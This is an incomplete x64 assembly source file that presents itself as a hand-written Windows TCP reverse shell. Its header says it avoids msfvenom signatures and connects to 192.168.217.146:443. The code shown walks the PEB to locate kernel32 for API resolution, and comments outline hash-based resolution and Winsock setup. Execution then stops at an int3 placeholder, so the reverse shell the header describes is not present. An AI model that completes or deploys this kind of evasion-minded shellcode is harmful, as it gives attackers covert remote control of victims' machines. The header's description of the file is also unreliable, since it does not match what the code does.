; SilentGate - Custom x64 TCP Reverse Shell
; Author: JarDani
; Hand written - no msfvenom signatures
; Connects to 192.168.217.146:443

BITS 64
DEFAULT REL

; We use PEB walk to find kernel32 then resolve APIs
; This avoids hardcoded addresses

start:
    ; Align stack
    and rsp, 0xFFFFFFFFFFFFFFF0
    sub rsp, 0x28

    ; Find kernel32 base via PEB
    ; GS:[0x60] = PEB
    mov rax, [gs:0x60]
    mov rax, [rax + 0x18]      ; PEB->Ldr
    mov rax, [rax + 0x20]      ; InMemoryOrderModuleList
    mov rax, [rax]             ; Flink (ntdll)
    mov rax, [rax]             ; Flink (kernel32)
    mov rax, [rax + 0x20]      ; DllBase = kernel32 base

    ; Store kernel32 base
    mov r15, rax

    ; For brevity in this version - use a simpler approach
    ; Call LoadLibraryA("ws2_32") then WSAStartup etc
    ; via hash-based API resolution

    ; Simple version - just int3 for now to test execution
    ; We will fill this with full shellcode
    int3
    ret
